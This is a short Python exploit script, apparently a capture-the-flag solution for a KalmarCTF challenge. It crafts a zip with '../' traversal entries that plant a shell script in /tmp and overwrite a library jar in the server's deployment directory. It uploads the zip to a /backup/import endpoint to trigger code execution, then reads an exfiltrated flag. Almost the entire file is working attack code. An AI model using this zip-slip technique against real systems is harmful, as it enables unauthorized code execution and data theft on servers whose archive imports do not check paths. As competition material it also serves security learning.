import zipfile
import requests

sess = requests.Session()
HOST = "http://localhost:7070"
# HOST = 'https://e11f64c73f782e0fc98eb08dd2cd6009-31189.inst1.chal-kalmarc.tf'

# Add jar with payload and `exploit.sh` to `exported.zip`
filename_jar = 'org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar'
target_filename_jar = '/deployments/lib/main/' + filename_jar

filename_exploit = 'exploit.sh'
target_filename_exploit = '/tmp/exploit.sh'

exported_zip = 'exported.zip'
with zipfile.ZipFile(exported_zip, "a") as zf:
    zf.writestr('../../../..' + target_filename_exploit, open(filename_exploit, 'rb').read())
    zf.writestr('../../../..' + target_filename_jar, open(filename_jar, 'rb').read())

# First request - Ensure the subdirectories in /tmp/vertx-cache/ are created, so we can exfil the flag there
r = sess.get(f"{HOST}/q/swagger-ui/")
print("First:", r.status_code)

# Second request - file upload. Trigger zip slip and code execution in same request
r = sess.post(f"{HOST}/backup/import", data=open(exported_zip, "rb"), headers={"Content-Type": "application/zip"})
print("Second:", r.status_code)

# Third request - retrieve the flag
r = sess.get(f"{HOST}/q/swagger-ui/flag_exfil")
print("Third:", r.status_code, end='\n\n')
flag = r.text
print(flag)
